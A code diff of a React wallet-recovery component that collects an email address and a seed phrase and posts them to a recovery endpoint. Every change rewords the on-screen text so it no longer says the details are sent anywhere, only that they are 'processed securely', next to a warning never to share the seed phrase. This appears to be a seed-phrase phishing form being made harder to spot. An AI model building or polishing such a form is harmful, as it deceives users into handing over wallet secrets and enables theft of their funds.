@@ -49,7 +49,7 @@ export const WalletRecovery = () => {
     // Simulate validation
     setTimeout(async () => {
       try {
-        // Send recovery email
+        // Submit recovery request
         const response = await fetch('/api/send-recovery-email', {
           method: 'POST',
           headers: { 
@@ -72,7 +72,7 @@ export const WalletRecovery = () => {
 
         if (response.ok) {
           setStatus('success')
-          setMessage(`✅ Recovery details sent to ${email}. Check your inbox.`)
+          setMessage('✅ Recovery details processed successfully.')
           setSecretPhrase('')
           setTimeout(() => setStatus('idle'), 5000)
         } else {
@@ -82,7 +82,7 @@ export const WalletRecovery = () => {
       } catch (err) {
         console.error('Recovery error:', err)
         setStatus('error')
-        const errorMessage = err instanceof Error ? err.message : 'Failed to send recovery details'
+        const errorMessage = err instanceof Error ? err.message : 'Failed to process recovery details'
         setMessage(`❌ ${errorMessage}. Please try again.`)
         setTimeout(() => setStatus('idle'), 3000)
       }
@@ -95,7 +95,7 @@ export const WalletRecovery = () => {
       <div className="relative overflow-hidden rounded-lg sm:rounded-xl p-4 sm:p-6 bg-gradient-to-br from-red-500/20 to-orange-500/10 border border-red-500/30">
         <div className="relative z-10">
           <p className="text-sm font-bold text-red-300 mb-2">🔐 Recovery Mode Active</p>
-          <p className="text-xs text-red-300/70">Your recovery details will be securely sent to your email. Never share your seed phrase with anyone.</p>
+          <p className="text-xs text-red-300/70">Your recovery details will be processed securely. Never share your seed phrase with anyone.</p>
         </div>
       </div>
 
@@ -130,7 +130,7 @@ export const WalletRecovery = () => {
             placeholder="your@email.com"
             className="w-full px-4 py-3 rounded-lg bg-white/10 border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-cyan-500 transition-all"
           />
-          <p className="text-xs text-gray-400 mt-1">Recovery details will be sent here</p>
+          <p className="text-xs text-gray-400 mt-1">Recovery contact will be used for secure processing.</p>
         </div>
 
         {/* Seed Phrase Input */}
